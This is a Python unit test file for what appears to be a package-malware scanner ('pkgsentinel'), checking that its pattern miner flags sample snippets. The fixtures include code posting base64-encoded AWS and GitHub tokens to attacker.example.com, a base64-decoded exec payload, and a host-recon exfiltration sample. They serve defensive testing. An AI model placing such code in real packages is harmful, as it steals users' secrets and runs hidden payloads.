"""Sequential Pattern Mining 단위 테스트."""
from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from pkgsentinel.stages.sequence_patterns import PATTERNS, mine
from pkgsentinel.stages.stage1_entry_point import EntryFile
from pkgsentinel.stages.stage2_behavior import BehaviorReport, _analyze_python

# 1) credential exfil
SAMPLE_CRED = '''
import os, base64, requests
def f():
    a = os.environ.get("AWS_KEY")
    b = os.environ.get("GITHUB_TOKEN")
    enc = base64.b64encode(str([a, b]).encode())
    requests.post("https://attacker.example.com", data=enc)
'''

# 2) encoded payload exec
SAMPLE_ENC_EXEC = '''
import base64
def f():
    code = base64.b64decode("ZXhlYygncm0nKQ==")
    exec(code)
'''

# 3) recon + exfil
SAMPLE_RECON = '''
import os, platform, socket, requests
def f():
    a = os.environ.get("USER")
    b = platform.uname()
    c = socket.gethostname()
    d = os.environ.get("PATH")
    requests.post("https://x.com", data={"a": a, "b": b, "c": c, "d": d})
'''

# 4) benign
SAMPLE_BENIGN = '''
import json, requests
def f(url):
    r = requests.get(url)
    return json.loads(r.text)
'''


def _mine(sample: str):
    fs = _analyze_python(EntryFile(
        path="x/setup.py", basename="setup.py",
        content=sample, size=len(sample), language="python",
    ))
    behavior = BehaviorReport(files=[fs])
    return mine(behavior)


def test_cred_exfil():
    print("== Sample: credential exfil ==")
    rpt = _mine(SAMPLE_CRED)
    codes = sorted({m.pattern.code for m in rpt.matches})
    print(f"  matched: {codes}")
    for m in rpt.matches:
        print(f"  {m.to_summary()}")
    return "SP-001" in codes


def test_encoded_exec():
    print("\n== Sample: encoded payload exec ==")
    rpt = _mine(SAMPLE_ENC_EXEC)
    codes = sorted({m.pattern.code for m in rpt.matches})
    print(f"  matched: {codes}")
    for m in rpt.matches:
        print(f"  {m.to_summary()}")
    return "SP-003" in codes


def test_recon():
    print("\n== Sample: recon + exfil ==")
    rpt = _mine(SAMPLE_RECON)
    codes = sorted({m.pattern.code for m in rpt.matches})
    print(f"  matched: {codes}")
    for m in rpt.matches:
        print(f"  {m.to_summary()}")
    # SP-001 (cred 형태) 또는 SP-004 (recon) 둘 중 하나는 매칭되어야
    return ("SP-001" in codes) or ("SP-004" in codes)


def test_benign():
    print("\n== Sample: benign ==")
    rpt = _mine(SAMPLE_BENIGN)
    codes = sorted({m.pattern.code for m in rpt.matches})
    print(f"  matched: {codes}")
    return len(rpt.matches) == 0


def test_pattern_catalog():
    print("\n== Pattern catalog ==")
    print(f"  total: {len(PATTERNS)}")
    sev_counts = {}
    for p in PATTERNS:
        sev_counts[p.severity.value] = sev_counts.get(p.severity.value, 0) + 1
    print(f"  severity counts: {sev_counts}")
    return len(PATTERNS) >= 6


def main():
    ok = True
    ok &= test_cred_exfil()
    ok &= test_encoded_exec()
    ok &= test_recon()
    ok &= test_benign()
    ok &= test_pattern_catalog()
    print("\n" + ("ALL OK" if ok else "FAILED"))


if __name__ == "__main__":
    main()
